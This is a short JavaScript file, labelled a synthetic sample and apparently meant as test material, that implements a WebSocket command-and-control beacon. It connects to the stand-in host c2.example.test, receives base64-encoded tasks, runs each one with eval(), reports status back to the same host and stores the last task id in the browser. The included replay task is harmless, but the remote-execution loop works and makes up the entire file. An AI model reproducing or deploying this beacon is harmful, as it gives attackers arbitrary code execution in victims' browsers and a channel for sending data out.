// SPECTREWS — synthetic WebSocket C2 product sample.
(function () {
  var ENDPOINT = 'wss://c2.example.test/ws';
  var HTTP = 'https://c2.example.test/result';
  var attempts = 0;
  console.log('[SPECTREWS] controller online', ENDPOINT);

  function runCommand(message) {
    var command = JSON.parse(message);
    var code = atob(command.task || '');
    console.log('[SPECTREWS] command', command.id, code.length);
    try { eval(code); } catch (error) { console.log('[SPECTREWS] task error', error.message); }
    try {
      fetch(HTTP, { method: 'POST', body: btoa(JSON.stringify({ id: command.id, status: 'done' })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('spectrews:last', command.id || 'none'); } catch (error) {}
  }

  function connect() {
    attempts += 1;
    try {
      var socket = new WebSocket(ENDPOINT + '?attempt=' + attempts);
      socket.onopen = function () { socket.send(JSON.stringify({ hello: 'spectre', attempt: attempts })); };
      socket.onmessage = function (event) { runCommand(String(event.data)); };
      socket.onerror = function () { console.log('[SPECTREWS] socket error'); };
    } catch (error) {}
    if (attempts < 2) setTimeout(connect, 500);
  }
  connect();
  // Local command queue replays the last task if the socket is unavailable.
  try { runCommand(JSON.stringify({ id: 'task-1', task: 'Y29uc29sZS5sb2coJ1tTUEVDVFJFV1NdIHRhc2stMSBleGVjdXRlZCcp' })); } catch (error) {}
})();
